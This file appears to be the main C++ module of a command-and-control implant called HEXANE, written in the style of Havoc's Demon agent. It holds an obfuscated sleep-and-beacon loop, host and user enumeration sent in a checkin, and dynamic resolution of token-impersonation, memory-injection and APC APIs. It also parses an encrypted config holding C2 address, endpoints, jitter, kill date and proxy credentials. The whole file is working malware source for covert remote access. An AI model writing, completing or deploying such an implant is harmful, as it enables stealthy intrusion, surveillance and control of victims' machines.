#include <core/include/base.hpp>

using namespace Xtea;
using namespace Opsec;
using namespace Parser;
using namespace Stream;
using namespace Dispatcher;
using namespace Memory::Context;

// TODO: delegate functions and api separately to stager/payload
namespace Main {
    UINT8 RDATA Config[CONFIG_SIZE] = { 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa, };

    VOID MainRoutine() {
        HEXANE;

        static int retry = 0;
        // TODO: thread stack spoofing
        do {
            if (!ObfuscateSleep(nullptr, nullptr) ||
                !RuntimeChecks()) {
                break;
            }

            if (!CheckTime()) {
                continue;
            }
            if (!ctx->session.checkin && !ctx->message_queue) {
                if (!EnumSystem()) {
                    break;
                }
            }

            if (!DispatchRoutine()) {
                ctx->session.retries++;
                if (retry == ctx->session.retries) {
                    break;
                }

                continue;
            }

            retry = 0;
        }
        while (ntstatus != ERROR_EXIT);
        ContextDestroy();
    }

  BOOL EnumSystem() {
    // resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
    HEXANE;

    _stream *out = CreateStreamWithHeaders(TypeCheckin);

    IP_ADAPTER_INFO adapter     = { };
    OSVERSIONINFOW os_version   = { };
    BOOL success = false;

    PROCESSENTRY32 proc_entry   = { };
    proc_entry.dwSize           = sizeof(PROCESSENTRY32);

    HANDLE snap = ctx->enumapi.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        goto defer;
    }

    x_ntassertb(ctx->enumapi.RtlGetVersion(&os_version));

    ctx->session.version = WIN_VERSION_UNKNOWN;
    os_version.dwOSVersionInfoSize = sizeof(os_version);

    if (os_version.dwMajorVersion >= 5) {
        if (os_version.dwMajorVersion == 5) {
            if (os_version.dwMinorVersion == 1) {
                        ctx->session.version = WIN_VERSION_XP;
            }
      }
      else if (os_version.dwMajorVersion == 6) {
        if (os_version.dwMinorVersion == 0) {
            ctx->session.version = WIN_VERSION_2008;
        }
        else if (os_version.dwMinorVersion == 1) {
            ctx->session.version = WIN_VERSION_2008_R2;
        }
        else if (os_version.dwMinorVersion == 2) {
            ctx->session.version = WIN_VERSION_2012;
        }
        else if (os_version.dwMinorVersion == 3) {
            ctx->session.version = WIN_VERSION_2012_R2;
        }
      } else if (os_version.dwMajorVersion == 10) {
            if (os_version.dwMinorVersion == 0) {
                ctx->session.version = WIN_VERSION_2016_X;
            }
        }
    }

    DWORD name_len = MAX_PATH;
    CHAR buffer[MAX_PATH] = { };

    if (ctx->enumapi.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &name_len)) {
        if (ctx->config.hostname[0]) {
            if (MbsBoundCompare(buffer, ctx->config.hostname, MbsName_Len(ctx->config.hostname)) != 0) {
                // LOG ERROR (bad host)
                success = true;
                goto defer;
            }
        }
        PackString(out, buffer);
    }
    else {
        PackUint32(out, 0);
    }

    MemSet(buffer, 0, MAX_PATH);
    name_len = MAX_PATH;

    if (ctx->enumapi.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &name_len)) {
        if (ctx->network.domain[0]) {
            if (MbsBoundCompare(ctx->network.domain, buffer, MbsName_Len(ctx->network.domain)) != 0) {
                // LOG ERROR (bad domain)
                success = true;
                goto defer;
            }
        }
        PackString(out, buffer);
    }
    else {
        PackUint32(out, 0);
    }

    MemSet(buffer, 0, MAX_PATH);
    name_len = MAX_PATH;

    if (ctx->enumapi.GetUserNameA((LPSTR) buffer, &name_len)) {
        PackString(out, buffer);
    }
    else {
        PackUint32(out, 0);
    }

    MemSet(buffer, 0, MAX_PATH);
    name_len = sizeof(IP_ADAPTER_INFO);

    if (ctx->enumapi.GetAdaptersInfo(&adapter, &name_len) == NO_ERROR) {
        PackString(out, adapter.IpAddressList.IpAddress.String);
    }
    else {
        PackUint32(out, 0);
    }

    MemSet(&adapter, 0, sizeof(IP_ADAPTER_INFO));
    success = true;

  defer:
    success ? MessageQueue(out) : DestroyStream(out);
    return success;
  }

    BOOL ResolveApi() {
        // TODO: create separate ResolveApi for loader and payload
		HEXANE;

		bool success = true;
		x_assertb(ctx->modules.kernel32 = (HMODULE) M_PTR(KERNEL32));
		x_assertb(ctx->modules.kernbase = (HMODULE) M_PTR(KERNELBASE));
		x_assertb(ctx->modules.shlwapi	= (HMODULE) M_PTR(SHLWAPI));

    	// TODO: Memory leak for heap-allocated EXECUTABLE*. Only need DllBase
        x_assertb(ctx->modules.crypt32  = (HMODULE) ImportModule(LoadLocalFile, CRYPT32, nullptr, 0, nullptr)->base);
        x_assertb(ctx->modules.winhttp  = (HMODULE) ImportModule(LoadLocalFile, WINHTTP, nullptr, 0, nullptr)->base);
        x_assertb(ctx->modules.advapi   = (HMODULE) ImportModule(LoadLocalFile, ADVAPI32, nullptr, 0, nullptr)->base);
        x_assertb(ctx->modules.iphlpapi = (HMODULE) ImportModule(LoadLocalFile, IPHLPAPI, nullptr, 0, nullptr)->base);
        x_assertb(ctx->modules.mscoree  = (HMODULE) ImportModule(LoadLocalFile, MSCOREE, nullptr, 0, nullptr)->base);
        x_assertb(ctx->modules.kernbase  = (HMODULE) ImportModule(LoadLocalFile, KERNBASE, nullptr, 0, nullptr)->base);

#pragma region ioapi
		x_assertb(F_PTR_HMOD(ctx->ioapi.FileTimeToSystemTime, 						ctx->modules.kernel32, FILETIMETOSYSTEMTIME));
		x_assertb(F_PTR_HMOD(ctx->ioapi.GetCurrentDirectoryA, 						ctx->modules.kernel32, GETCURRENTDIRECTORYA));
		x_assertb(F_PTR_HMOD(ctx->ioapi.SystemTimeToTzSpecificLocalTime, 			ctx->modules.kernel32, SYSTEMTIMETOTZSPECIFICLOCALTIME));
		x_assertb(F_PTR_HMOD(ctx->ioapi.GetFileAttributesW, 						ctx->modules.kernel32, GETFILEATTRIBUTESW));
		x_assertb(F_PTR_HMOD(ctx->ioapi.CreateFileW, 								ctx->modules.kernel32, CREATEFILEW));
		x_assertb(F_PTR_HMOD(ctx->ioapi.FindFirstFileA, 							ctx->modules.kernel32, FINDFIRSTFILEA));
		x_assertb(F_PTR_HMOD(ctx->ioapi.FindNextFileA, 								ctx->modules.kernel32, FINDNEXTFILEA));
		x_assertb(F_PTR_HMOD(ctx->ioapi.FindClose, 									ctx->modules.kernel32, FINDCLOSE));
		x_assertb(F_PTR_HMOD(ctx->ioapi.GetFileSize, 								ctx->modules.kernel32, GETFILESIZE));
		x_assertb(F_PTR_HMOD(ctx->ioapi.ReadFile, 									ctx->modules.kernel32, READFILE));
#pragma endregion

#pragma region SECAPI
		x_assertb(F_PTR_HMOD(ctx->secapi.LookupAccountSidW, 						ctx->modules.advapi, LOOKUPACCOUNTSIDW));
		x_assertb(F_PTR_HMOD(ctx->secapi.LookupPrivilegeValueA, 					ctx->modules.advapi, LOOKUPPRIVILEGEVALUEA));
		x_assertb(F_PTR_HMOD(ctx->secapi.AddMandatoryAce, 							ctx->modules.advapi, ADDMANDATORYACE));
		x_assertb(F_PTR_HMOD(ctx->secapi.SetEntriesInAclA, 							ctx->modules.advapi, SETENTRIESINACLA));
		x_assertb(F_PTR_HMOD(ctx->secapi.AllocateAndInitializeSid, 					ctx->modules.advapi, ALLOCATEANDINITIALIZESID));
		x_assertb(F_PTR_HMOD(ctx->secapi.InitializeSecurityDescriptor, 				ctx->modules.advapi, INITIALIZESECURITYDESCRIPTOR));
		x_assertb(F_PTR_HMOD(ctx->secapi.SetSecurityDescriptorDacl, 				ctx->modules.advapi, SETSECURITYDESCRIPTORDACL));
		x_assertb(F_PTR_HMOD(ctx->secapi.SetSecurityDescriptorSacl, 				ctx->modules.advapi, SETSECURITYDESCRIPTORSACL));
		x_assertb(F_PTR_HMOD(ctx->secapi.InitializeAcl, 							ctx->modules.advapi, INITIALIZEACL));
		x_assertb(F_PTR_HMOD(ctx->secapi.FreeSid, 									ctx->modules.advapi, FREESID));
#pragma endregion

#pragma region NETAPI
		x_assertb(F_PTR_HMOD(ctx->netapi.WinHttpOpen, 								ctx->modules.winhttp, WINHTTPOPEN));
		x_assertb(F_PTR_HMOD(ctx->netapi.WinHttpConnect, 							ctx->modules.winhttp, WINHTTPCONNECT));
		x_assertb(F_PTR_HMOD(ctx->netapi.WinHttpOpenRequest, 						ctx->modules.winhttp, WINHTTPOPENREQUEST));
		x_assertb(F_PTR_HMOD(ctx->netapi.WinHttpAddRequestHeaders, 					ctx->modules.winhttp, WINHTTPADDREQUESTHEADERS));
		x_assertb(F_PTR_HMOD(ctx->netapi.WinHttpSetOption, 							ctx->modules.winhttp, WINHTTPSETOPTION));
		x_assertb(F_PTR_HMOD(ctx->netapi.WinHttpGetProxyForUrl, 					ctx->modules.winhttp, WINHTTPGETPROXYFORURL));
		x_assertb(F_PTR_HMOD(ctx->netapi.WinHttpGetIEProxyConfigForCurrentUser, 	ctx->modules.winhttp, WINHTTPGETIEPROXYCONFIGFORCURRENTUSER));
		x_assertb(F_PTR_HMOD(ctx->netapi.WinHttpSendRequest, 						ctx->modules.winhttp, WINHTTPSENDREQUEST));
		x_assertb(F_PTR_HMOD(ctx->netapi.WinHttpReceiveResponse, 					ctx->modules.winhttp, WINHTTPRECEIVERESPONSE));
		x_assertb(F_PTR_HMOD(ctx->netapi.WinHttpReadData, 							ctx->modules.winhttp, WINHTTPREADDATA));
		x_assertb(F_PTR_HMOD(ctx->netapi.WinHttpQueryHeaders, 						ctx->modules.winhttp, WINHTTPQUERYHEADERS));
		x_assertb(F_PTR_HMOD(ctx->netapi.WinHttpQueryDataAvailable, 				ctx->modules.winhttp, WINHTTPQUERYDATAAVAILABLE));
		x_assertb(F_PTR_HMOD(ctx->netapi.WinHttpCloseHandle, 						ctx->modules.winhttp, WINHTTPCLOSEHANDLE));
		x_assertb(F_PTR_HMOD(ctx->netapi.CallNamedPipeW, 							ctx->modules.kernel32, CALLNAMEDPIPEW));
		x_assertb(F_PTR_HMOD(ctx->netapi.CreateNamedPipeW, 							ctx->modules.kernel32, CREATENAMEDPIPEW));
		x_assertb(F_PTR_HMOD(ctx->netapi.WaitNamedPipeW, 							ctx->modules.kernel32, WAITNAMEDPIPEW));
		x_assertb(F_PTR_HMOD(ctx->netapi.SetNamedPipeHandleState, 					ctx->modules.kernel32, SETNAMEDPIPEHANDLESTATE));
		x_assertb(F_PTR_HMOD(ctx->netapi.ConnectNamedPipe, 							ctx->modules.kernel32, CONNECTNAMEDPIPE));
		x_assertb(F_PTR_HMOD(ctx->netapi.TransactNamedPipe, 						ctx->modules.kernel32, TRANSACTNAMEDPIPE));
		x_assertb(F_PTR_HMOD(ctx->netapi.DisconnectNamedPipe, 						ctx->modules.kernel32, DISCONNECTNAMEDPIPE));
		x_assertb(F_PTR_HMOD(ctx->netapi.PeekNamedPipe, 							ctx->modules.kernel32, PEEKNAMEDPIPE));
#pragma endregion

#pragma region PROCAPI
		x_assertb(F_PTR_HMOD(ctx->procapi.NtOpenProcess, 							ctx->modules.ntdll, NTOPENPROCESS));
		x_assertb(F_PTR_HMOD(ctx->procapi.NtCreateUserProcess, 						ctx->modules.ntdll, NTCREATEUSERPROCESS));
		x_assertb(F_PTR_HMOD(ctx->procapi.NtTerminateProcess, 						ctx->modules.ntdll, NTTERMINATEPROCESS));
		x_assertb(F_PTR_HMOD(ctx->procapi.RtlCreateProcessParametersEx, 			ctx->modules.ntdll, RTLCREATEPROCESSPARAMETERSEX));
		x_assertb(F_PTR_HMOD(ctx->procapi.RtlDestroyProcessParameters, 				ctx->modules.ntdll, RTLDESTROYPROCESSPARAMETERS));
		x_assertb(F_PTR_HMOD(ctx->procapi.NtOpenProcessToken, 						ctx->modules.ntdll, NTOPENPROCESSTOKEN));
		x_assertb(F_PTR_HMOD(ctx->procapi.NtOpenThreadToken, 						ctx->modules.ntdll, NTOPENTHREADTOKEN));
		x_assertb(F_PTR_HMOD(ctx->procapi.NtDuplicateToken, 						ctx->modules.ntdll, NTDUPLICATETOKEN));
		x_assertb(F_PTR_HMOD(ctx->procapi.NtDuplicateObject, 						ctx->modules.ntdll, NTDUPLICATEOBJECT));
		x_assertb(F_PTR_HMOD(ctx->procapi.NtQueryInformationToken, 					ctx->modules.ntdll, NTQUERYINFORMATIONTOKEN));
		x_assertb(F_PTR_HMOD(ctx->procapi.NtQueryInformationProcess, 				ctx->modules.ntdll, NTQUERYINFORMATIONPROCESS));
		x_assertb(F_PTR_HMOD(ctx->procapi.ImpersonateLoggedOnUser, 					ctx->modules.advapi, IMPERSONATELOGGEDONUSER));
		x_assertb(F_PTR_HMOD(ctx->procapi.AdjustTokenPrivileges, 					ctx->modules.advapi, ADJUSTTOKENPRIVILEGES));
#pragma endregion

#pragma region MEMAPI
		x_assertb(F_PTR_HMOD(ctx->memapi.NtFreeVirtualMemory, 						ctx->modules.ntdll, NTFREEVIRTUALMEMORY));
		x_assertb(F_PTR_HMOD(ctx->memapi.NtAllocateVirtualMemory, 					ctx->modules.ntdll, NTALLOCATEVIRTUALMEMORY));
		x_assertb(F_PTR_HMOD(ctx->memapi.NtProtectVirtualMemory, 					ctx->modules.ntdll, NTPROTECTVIRTUALMEMORY));
		x_assertb(F_PTR_HMOD(ctx->memapi.NtReadVirtualMemory, 						ctx->modules.ntdll, NTREADVIRTUALMEMORY));
		x_assertb(F_PTR_HMOD(ctx->memapi.NtWriteVirtualMemory, 						ctx->modules.ntdll, NTWRITEVIRTUALMEMORY));
		x_assertb(F_PTR_HMOD(ctx->memapi.NtQueryVirtualMemory, 						ctx->modules.ntdll, NTQUERYVIRTUALMEMORY));
		x_assertb(F_PTR_HMOD(ctx->memapi.NtCreateSection, 							ctx->modules.ntdll, NTCREATESECTION));
		x_assertb(F_PTR_HMOD(ctx->memapi.NtMapViewOfSection, 						ctx->modules.ntdll, NTMAPVIEWOFSECTION));
		x_assertb(F_PTR_HMOD(ctx->memapi.NtUnmapViewOfSection, 						ctx->modules.ntdll, NTUNMAPVIEWOFSECTION));
		x_assertb(F_PTR_HMOD(ctx->memapi.RtlAddVectoredExceptionHandler, 			ctx->modules.ntdll, RTLADDVECTOREDEXCEPTIONHANDLER));
		x_assertb(F_PTR_HMOD(ctx->memapi.RtlRemoveVectoredExceptionHandler, 		ctx->modules.ntdll, RTLREMOVEVECTOREDEXCEPTIONHANDLER));
		x_assertb(F_PTR_HMOD(ctx->memapi.SetProcessValidCallTargets, 				ctx->modules.kernbase, SETPROCESSVALIDCALLTARGETS));
		x_assertb(F_PTR_HMOD(ctx->memapi.RtlCreateHeap, 							ctx->modules.ntdll, RTLCREATEHEAP));
		x_assertb(F_PTR_HMOD(ctx->memapi.RtlAllocateHeap, 							ctx->modules.ntdll, RTLALLOCATEHEAP));
		x_assertb(F_PTR_HMOD(ctx->memapi.RtlReAllocateHeap, 						ctx->modules.ntdll, RTLREALLOCATEHEAP));
		x_assertb(F_PTR_HMOD(ctx->memapi.RtlFreeHeap, 								ctx->modules.ntdll, RTLFREEHEAP));
		x_assertb(F_PTR_HMOD(ctx->memapi.RtlDestroyHeap, 							ctx->modules.ntdll, RTLDESTROYHEAP));
		x_assertb(F_PTR_HMOD(ctx->memapi.RtlRbInsertNodeEx, 						ctx->modules.ntdll, RTLRBINSERTNODEEX));
		x_assertb(F_PTR_HMOD(ctx->memapi.GetProcAddress, 							ctx->modules.kernel32, GETPROCADDRESS));
		x_assertb(F_PTR_HMOD(ctx->memapi.GetModuleHandleA, 							ctx->modules.kernel32, GETMODULEHANDLEA));
		x_assertb(F_PTR_HMOD(ctx->memapi.LoadLibraryA, 								ctx->modules.kernel32, LOADLIBRARYA));
		x_assertb(F_PTR_HMOD(ctx->memapi.FreeLibrary, 								ctx->modules.kernel32, FREELIBRARY));
#pragma endregion

#pragma region ENUMAPI
		x_assertb(F_PTR_HMOD(ctx->enumapi.RegOpenKeyExA, 							ctx->modules.advapi, REGOPENKEYEXA));
		x_assertb(F_PTR_HMOD(ctx->enumapi.RegCreateKeyExA, 							ctx->modules.advapi, REGCREATEKEYEXA));
		x_assertb(F_PTR_HMOD(ctx->enumapi.RegSetValueExA, 							ctx->modules.advapi, REGSETVALUEEXA));
		x_assertb(F_PTR_HMOD(ctx->enumapi.RegCloseKey, 								ctx->modules.advapi, REGCLOSEKEY));
		x_assertb(F_PTR_HMOD(ctx->enumapi.GetAdaptersInfo, 							ctx->modules.iphlpapi, GETADAPTERSINFO));
    	x_assertb(F_PTR_HMOD(ctx->enumapi.IsWow64Process, 							ctx->modules.kernel32, ISWOW64PROCESS));
		x_assertb(F_PTR_HMOD(ctx->enumapi.GetUserNameA, 							ctx->modules.kernel32, GETUSERNAMEA));
		x_assertb(F_PTR_HMOD(ctx->enumapi.CreateToolhelp32Snapshot, 				ctx->modules.kernel32, CREATETOOLHELP32SNAPSHOT));
		x_assertb(F_PTR_HMOD(ctx->enumapi.Process32First, 							ctx->modules.kernel32, PROCESS32FIRST));
		x_assertb(F_PTR_HMOD(ctx->enumapi.Process32Next, 							ctx->modules.kernel32, PROCESS32NEXT));
		x_assertb(F_PTR_HMOD(ctx->enumapi.GlobalMemoryStatusEx, 					ctx->modules.kernel32, GLOBALMEMORYSTATUSEX));
		x_assertb(F_PTR_HMOD(ctx->enumapi.GetComputerNameExA, 						ctx->modules.kernel32, GETCOMPUTERNAMEEXA));
		x_assertb(F_PTR_HMOD(ctx->enumapi.RtlGetVersion, 							ctx->modules.ntdll, RTLGETVERSION));
		x_assertb(F_PTR_HMOD(ctx->enumapi.NtQuerySystemInformation, 				ctx->modules.ntdll, NTQUERYSYSTEMINFORMATION));
		x_assertb(F_PTR_HMOD(ctx->enumapi.NtQuerySystemTime, 						ctx->modules.ntdll, NTQUERYSYSTEMTIME));
		x_assertb(F_PTR_HMOD(ctx->enumapi.CLRCreateInstance, 						ctx->modules.kernel32, CLRCREATEINSTANCE));
#pragma endregion

#pragma region THREADAPI
		x_assertb(F_PTR_HMOD(ctx->threadapi.NtCreateThreadEx, 						ctx->modules.ntdll, NTCREATETHREADEX));
		x_assertb(F_PTR_HMOD(ctx->threadapi.NtOpenThread, 							ctx->modules.ntdll, NTOPENTHREAD));
		x_assertb(F_PTR_HMOD(ctx->threadapi.NtTerminateThread, 						ctx->modules.ntdll, NTTERMINATETHREAD));
		x_assertb(F_PTR_HMOD(ctx->threadapi.NtResumeThread, 						ctx->modules.ntdll, NTRESUMETHREAD));
		x_assertb(F_PTR_HMOD(ctx->threadapi.NtGetContextThread, 					ctx->modules.ntdll, NTGETCONTEXTTHREAD));
		x_assertb(F_PTR_HMOD(ctx->threadapi.NtSetContextThread, 					ctx->modules.ntdll, NTSETCONTEXTTHREAD));
		x_assertb(F_PTR_HMOD(ctx->threadapi.NtSetInformationThread, 				ctx->modules.ntdll, NTSETINFORMATIONTHREAD));
#pragma endregion

#pragma region APCAPI
		x_assertb(F_PTR_HMOD(ctx->apcapi.NtTestAlert, 								ctx->modules.ntdll, NTTESTALERT));
		x_assertb(F_PTR_HMOD(ctx->apcapi.NtDelayExecution, 							ctx->modules.ntdll, NTDELAYEXECUTION));
		x_assertb(F_PTR_HMOD(ctx->apcapi.NtCreateEvent, 							ctx->modules.ntdll, NTCREATEEVENT));
		x_assertb(F_PTR_HMOD(ctx->apcapi.NtQueueApcThread, 							ctx->modules.ntdll, NTQUEUEAPCTHREAD));
		x_assertb(F_PTR_HMOD(ctx->apcapi.NtAlertResumeThread, 						ctx->modules.ntdll, NTALERTRESUMETHREAD));
		x_assertb(F_PTR_HMOD(ctx->apcapi.NtWaitForSingleObject, 					ctx->modules.ntdll, NTWAITFORSINGLEOBJECT));
		x_assertb(F_PTR_HMOD(ctx->apcapi.NtSignalAndWaitForSingleObject, 			ctx->modules.ntdll, NTSIGNALANDWAITFORSINGLEOBJECT));
		x_assertb(F_PTR_HMOD(ctx->apcapi.NtContinue, 								ctx->modules.ntdll, NTCONTINUE));
#pragma endregion

#pragma region UTILAPI
		x_assertb(F_PTR_HMOD(ctx->utilapi.CryptStringToBinaryA, 					ctx->modules.crypt32, CRYPTSTRINGTOBINARYA));
		x_assertb(F_PTR_HMOD(ctx->utilapi.CryptBinaryToStringA, 					ctx->modules.crypt32, CRYPTBINARYTOSTRINGA));
		x_assertb(F_PTR_HMOD(ctx->utilapi.SleepEx, 									ctx->modules.kernel32, SLEEPEX));
    	x_assertb(F_PTR_HMOD(ctx->utilapi.FindResourceA, 							ctx->modules.kernel32, FINDRESOURCEA));
		x_assertb(F_PTR_HMOD(ctx->utilapi.LoadResource, 							ctx->modules.kernel32, LOADRESOURCE));
		x_assertb(F_PTR_HMOD(ctx->utilapi.LockResource, 							ctx->modules.kernel32, LOCKRESOURCE));
		x_assertb(F_PTR_HMOD(ctx->utilapi.SizeofResource, 							ctx->modules.kernel32, SIZEOFRESOURCE));
		x_assertb(F_PTR_HMOD(ctx->utilapi.FreeResource, 							ctx->modules.kernel32, FREERESOURCE));
		x_assertb(F_PTR_HMOD(ctx->utilapi.RtlInitUnicodeString, 					ctx->modules.ntdll, RTLINITUNICODESTRING));
		x_assertb(F_PTR_HMOD(ctx->utilapi.RtlHashUnicodeString, 					ctx->modules.ntdll, RTLHASHUNICODESTRING));
		x_assertb(F_PTR_HMOD(ctx->utilapi.RtlRandomEx, 								ctx->modules.ntdll, RTLRANDOMEX));
		x_assertb(F_PTR_HMOD(ctx->utilapi.NtClose, 									ctx->modules.ntdll, NTCLOSE));
#pragma endregion

#if defined(PAYLOAD)
		// httpapi
		// pipeapi
		// enumapi
		// memapi
		// heapapi
		// utilapi
		// procapi
		// ioapi
		// secapi

#elif defined(STAGER)
		// TODO: stager does not need everything and can reduce size by omitting certain api structs
		// httpapi
		// enumapi
		// memapi
		// heapapi
		// procapi
		// secapi
		// EnumSystem
#endif
	defer:
		return success;
	}

    BOOL ReadConfig() {
        HEXANE;

        _parser parser  = { };
        bool success    = true;

        CreateParser(&parser, Config, sizeof(Config));
        MemSet(Config, 0, sizeof(Config));

        ctx->message_queue		= nullptr;
        ctx->session.peer_id	= UnpackUint32(&parser);

        ParserMemcpy(&parser, &ctx->config.session_key, nullptr);

        if (ENCRYPTED) {
            XteaCrypt(B_PTR(parser.buffer), parser.length, ctx->config.session_key, false);
        }

        ParserStrcpy(&parser, &ctx->config.hostname, nullptr);

        ctx->session.retries        = UnpackUint32(&parser);
        ctx->config.working_hours   = UnpackUint32(&parser);
        ctx->config.kill_date       = UnpackUint64(&parser);
        ctx->config.sleeptime       = UnpackUint32(&parser);
        ctx->config.jitter          = UnpackUint32(&parser);

#ifdef TRANSPORT_HTTP
        ctx->network.http = (_http_context*) Malloc(sizeof(_http_context));

        ctx->network.http->handle     = nullptr;
        ctx->network.http->endpoints  = nullptr;
        ctx->network.http->headers    = nullptr;

        ParserWcscpy(&parser, &ctx->network.http->useragent, nullptr);
        ParserWcscpy(&parser, &ctx->network.http->address, nullptr  );
        ctx->network.http->port = (int) UnpackUint32(&parser);
        ParserStrcpy(&parser, &ctx->network.domain, nullptr);

        ctx->network.http->n_endpoints = UnpackUint32(&parser);
        ctx->network.http->endpoints  = (wchar_t**) Malloc(sizeof(wchar_t*) * ((ctx->network.http->n_endpoints + 1)));

        for (auto i = 0; i < ctx->network.http->n_endpoints; i++) {
            ParserWcscpy(&parser, &ctx->network.http->endpoints[i], nullptr);
        }

        ctx->network.http->endpoints[ctx->network.http->n_endpoints] = nullptr;
        ctx->network.b_proxy = UnpackBool(&parser);

        if (ctx->network.b_proxy) {
            ctx->network.http->proxy = (_proxy*) Malloc(sizeof(_proxy));
            ctx->network.http->access = INTERNET_OPEN_TYPE_PROXY;

            ParserWcscpy(&parser, &ctx->network.http->proxy->address, nullptr );
            ParserWcscpy(&parser, &ctx->network.http->proxy->username, nullptr );
            ParserWcscpy(&parser, &ctx->network.http->proxy->password, nullptr );
        }
#endif
#ifdef TRANSPORT_PIPE
        ParserWcscpy(&parser, &ctx->network.pipe_name, nullptr);
#endif

    defer:
        DestroyParser(&parser);
        return success;
    }
}

using namespace Main;
VOID Entrypoint() {

    __debugbreak();
    if (!ContextInit() || !ResolveApi() || !ReadConfig()) {
        return;
    }

    MainRoutine();
}
